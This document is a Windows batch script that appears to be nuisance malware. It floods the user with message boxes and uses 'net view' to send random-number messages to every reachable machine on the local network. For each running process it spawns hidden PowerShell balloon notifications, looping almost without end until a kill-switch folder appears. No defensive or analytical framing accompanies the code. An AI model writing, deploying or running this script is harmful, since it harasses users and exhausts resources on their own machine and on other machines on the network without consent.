@echo off
chcp 65001>nul

setlocal EnableDelayedExpansion





for %%z in ("%path_desktop%\%app_date%" "%systemDrive%\%app_date%") do if exist %%z exit



for /f "delims=" %%i in ('type "%~dp0messages.txt"') do (
  for %%z in ("%path_desktop%\%app_date%" "%systemDrive%\%app_date%") do if exist %%z exit

  msg /w /time:3 %userName% %%i
)



for /l %%i in (1,1,1000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000) do (
  for %%z in ("%path_desktop%\%app_date%" "%systemDrive%\%app_date%") do if exist %%z exit

  set message=!random!!random!!random!!random!!random!!random!!random!!random!!random!!random!!random!!random!!random!!random!!random!!random!!random!!random!!random!!random!!random!!random!!random!!random!!random!!random!!random!!random!!random!!random!!random!!random!

  msg /w /time:1 %userName% !message!
  for /f "skip=3 tokens=1,* delims=\ " %%h in ('net view 2^>nul') do if /i "%%h" NEQ "The" msg /time:1 /server:%%h %userName% !message!

  for /f "skip=4 delims= " %%p in ('tasklist') do (
    for %%z in ("%path_desktop%\%app_date%" "%systemDrive%\%app_date%") do if exist %%z exit

    set arg_process=%%p
    set arg_process=!arg_process:.exe=!

    for %%x in (Info Warning Error) do start /min powershell "Add-Type -AssemblyName System.Windows.Forms; $balloon = New-Object System.Windows.Forms.NotifyIcon; $path = (Get-Process -Name !arg_process!).Path; $balloon.Icon = [System.Drawing.Icon]::ExtractAssociatedIcon($path); $balloon.BalloonTipIcon = [System.Windows.Forms.ToolTipIcon]::%%x; $balloon.BalloonTipText = '!message!'; $balloon.BalloonTipTitle = '%%x'; $balloon.Visible = $true; $balloon.ShowBalloonTip(50000)"
  )

  timeout /t 1 >nul
)
exit